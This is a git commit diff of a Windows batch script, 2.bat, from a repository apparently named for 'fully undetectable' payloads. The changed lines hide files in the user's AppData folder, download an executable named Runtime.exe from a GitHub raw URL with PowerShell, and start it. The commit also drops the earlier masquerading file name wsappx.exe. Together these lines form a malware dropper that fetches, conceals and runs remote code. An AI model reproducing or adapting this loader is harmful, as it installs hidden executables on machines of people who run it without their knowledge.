a791786d346c3175d529565b20b1bc438e39f8ff
AnonAm39 <166949415+AnonAm39@users.noreply.github.com>
2024-04-18 22:50:29 +0200

    Update 2.bat

--- 2.bat
+++ 2.bat
@@ -31,6 +31,6 @@ if '%errorlevel%' NEQ '0' (
 
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
 attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\2.bat" /s /d
-attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\wsappx.exe" /s /d
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm39/fud/raw/main/Runtime.exe' -OutFile wsappx.exe"
+attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Runtime.exe" /s /d
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm39/fud/raw/main/Runtime.exe' -OutFile Runtime.exe"
 start Runtime.exe
